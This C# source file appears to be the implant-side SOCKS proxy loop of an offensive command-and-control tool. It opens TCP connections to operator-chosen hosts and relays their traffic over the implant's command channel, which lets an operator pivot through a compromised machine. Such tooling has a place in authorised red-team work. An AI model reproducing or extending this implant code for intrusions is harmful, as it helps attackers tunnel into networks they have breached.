using Common.Classes.Encryption;
using ImplantSide.Classes.Comms;
using ImplantSide.Classes.ErrorHandler;
using ImplantSide.Classes.Target;
using ImplantSide.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;

namespace SocksProxy.Classes.Socks
{
    public class SocksLoopController
    {
        internal Dictionary<String, TargetInfo> _targets = new Dictionary<String, TargetInfo>();
        public InternalErrorHandler ErrorHandler { get; set; }
        public IImplantLog ImplantComms { get; set; }
        public IEncryptionHelper Encryption { get; set; }
        public CommandCommunicationHandler CmdCommshandler { get; set; }
        public AutoResetEvent Timeout = new AutoResetEvent(false);
        static readonly ushort TOTALSOCKETTIMEOUT = 30000;
        static readonly ushort TIMEBETWEENREADS = 500;
        static readonly ushort TIMEBETWEENSERVERSENDS = 500;

        public bool OpenNewConnectionToTarget(String targetId, String targetHost, ushort targetPort)
        {
            var target = new TargetInfo();
            System.Net.Sockets.AddressFamily AF_TYPE = System.Net.Sockets.AddressFamily.InterNetwork;
            //Step 1. Open connection to target
            IPAddress targetIP = null;
            try
            {
                var hostNameType = Uri.CheckHostName(targetHost);
                switch (hostNameType)
                {
                    case UriHostNameType.Dns:
                        var iph = Dns.GetHostEntry(targetHost);
                        if (null != iph && null != iph.AddressList)
                        {
                            var firstIP = iph.AddressList.First();
                            if (null != firstIP && !String.IsNullOrWhiteSpace(firstIP.ToString()))
                                targetIP = firstIP;
                            else
                            {
                                ErrorHandler.LogError($"Unable to resolve the host {targetHost}");
                                return false;
                            }
                            if (Uri.CheckHostName(targetIP.ToString()) == UriHostNameType.IPv6)
                                AF_TYPE = System.Net.Sockets.AddressFamily.InterNetworkV6;
                        }   
                        break;
                    case UriHostNameType.IPv6:
                    case UriHostNameType.IPv4:
                        targetIP = IPAddress.Parse(targetHost);
                        break; 
                    default:
                        ErrorHandler.LogError($"Unable to resolve the host {targetHost}");
                        return false;
                }

                if (Uri.CheckHostName(targetIP.ToString()) == UriHostNameType.IPv6)
                    AF_TYPE = System.Net.Sockets.AddressFamily.InterNetworkV6; ;
                
                target.TargetTcpClient = new System.Net.Sockets.TcpClient(AF_TYPE);
                target.TargetTcpClient.Connect(new System.Net.IPEndPoint(targetIP, targetPort));
            }
            catch (Exception ex)
            {
                var lst = new List<String>
                {
                    "Failed to create connection to " + targetIP.ToString() + " on port " + targetPort.ToString(),
                    ex.Message
                };
                ErrorHandler.LogError(lst);
                return false;
            }

            //Step 2. Start Proxy Loop
            target.ProxyLoop = new System.Threading.Tasks.Task((g) =>
            {
                try
                {
                    ProxyLoop((String)g);
                }
                catch (Exception ex)
                {
                    ErrorHandler.LogError($"Error in proxy loop: {ex.Message}");

                    if (null != target && null != target.TargetTcpClient)
                        if (target.TargetTcpClient.Connected)
                            target.TargetTcpClient.Close();
                }
            }, targetId);

            _targets.Add(targetId, target);
            target.ProxyLoop.Start();
            return true;
        }

        void ProxyLoop(String targetId)
        {
            List<byte> toSend = null;
            bool timedOut = false;
            bool connectionHasFailed = false;
            TargetInfo target = null;
            try
            {
                target = _targets[targetId];
                if (null == target)
                {
                    ErrorHandler.LogError("Can't find target for GUID: " + targetId.ToString() + " exiting this proxy loop");
                    return;
                }
                var timeout = 0;
                var timeoutCtr = 0;
                var serverTimeCtr = 0;

                toSend = CmdCommshandler.Send(targetId, "nochange", null);
                if (null == toSend || toSend.Count() == 0) //No data to send just bail here connection on server side no doubt has been closed
                {
                    ErrorHandler.LogError($"Connection opened but no data sent for {target.TargetIP}:{target.TargetIP} binning connection now");
                    connectionHasFailed = true;
                }
                while (!target.Exit && !timedOut && !connectionHasFailed)
                {
                    var stream = target.TargetTcpClient.GetStream();
                    if (!target.TargetTcpClient.Connected)
                    {
                        timedOut = true;
                        break;
                    }
                    if (toSend != null && toSend.Count() > 0)
                    {
                        stream.Write(toSend.ToArray(), 0, toSend.Count());
                        stream.Flush();
                        ImplantComms.LogMessage($"Written {toSend.Count()} from client");
                        //Clear out the data to send after it has been sent
                        toSend = null;
                    }

                    while ((null == toSend || toSend.Count() == 0) && !(timedOut =(timeoutCtr > (TOTALSOCKETTIMEOUT / TIMEBETWEENREADS))))
                    {
                        if (stream.DataAvailable)
                        {
                            ImplantComms.LogMessage($"Socks {target.TargetTcpClient.Client.RemoteEndPoint.ToString()} reading {target.TargetTcpClient.Available} bytes");

                            var bytesRead = 0;
                            var lstBuffer = new List<byte>();
                            var arrayBuffer = new byte[65535];

                            bytesRead = stream.Read(arrayBuffer, 0, 65535);
                            lstBuffer.AddRange(arrayBuffer.ToList().Take(bytesRead));

                            while (bytesRead > 0 && stream.DataAvailable)
                            {
                                arrayBuffer = new byte[65535];
                                bytesRead = stream.Read(arrayBuffer, 0, 65535);
                                lstBuffer.AddRange(arrayBuffer.ToList().Take(bytesRead));
                            }
                            
                         //   ImplantComms.HexDump(lstBuffer.ToArray(), 16);

                            if (lstBuffer.Count() > 0)
                                toSend = CmdCommshandler.Send(targetId, "nochange", lstBuffer);

                            timeout = 0;
                            timeoutCtr = 0;
                        }
                        else
                        {
                            timeout += TIMEBETWEENREADS;
                            if (timeoutCtr > 1)
                            {
                                //Nothing is being read from the server quick check to see if the client has anything
                                serverTimeCtr += timeout;
                                if ((serverTimeCtr % TIMEBETWEENSERVERSENDS) == 0)
                                {
                                    toSend = CmdCommshandler.Send(targetId, "nochange", null);
                                    if (null == toSend) //Cant't have worked just bail here connection no doubt has been closed
                                    {
                                        connectionHasFailed = true;
                                        break;
                                    }
                                }
                            }
                            Timeout.WaitOne(timeout);
                            timeoutCtr++;
                        }
                    }
                }
            }
            catch(Exception ex)
            {
                ErrorHandler.LogError($"ERROR: {target.TargetTcpClient.Client.RemoteEndPoint.ToString()} {ex.Message}");
                if (null != target && null != target.TargetTcpClient)
                    if (target.TargetTcpClient.Connected)
                        target.TargetTcpClient.Close();
                else
                        ErrorHandler.LogError($"Target is null {target == null} & target.TargetTcpClient is null {target.TargetTcpClient == null} ");
            }
            finally
            {
                if (null != target && null != target.TargetTcpClient)
                    if (target.TargetTcpClient.Connected)
                        target.TargetTcpClient.Close();

                if (!connectionHasFailed)
                    CmdCommshandler.Send(targetId, "closed", null);
            }
        }

        public void StopAll()
        {
            ImplantComms.LogMessage($"Close all triggered");
            _targets.Keys.ToList().ForEach(x => {
                Stop(x);
            });
        }

        public void Stop(String targetId)
        {
            var target = _targets[targetId];
            ImplantComms.LogMessage($"Closing {target.TargetIP}:{target.TargetPort}");
            if (null != target)
            {
                target.Exit = true;
            }
        }

        public void HARDStopAll()
        {
            ImplantComms.LogMessage($"HARD STOP ALL TRIGGERED");
            _targets.Keys.ToList().ForEach(x => {
                HARDStop(x);
            });
        }

        public bool HARDStop(String targetId)
        {
            var target = _targets[targetId];
            ImplantComms.LogMessage($"HARD STOP ALL ON CONNECTION TO {target.TargetIP}:{target.TargetPort}");
            if (null != target)
            {
                target.Exit = true;
                target.TargetTcpClient.Close();
                return true;
            }
            else
                return false;
        }
    }
}
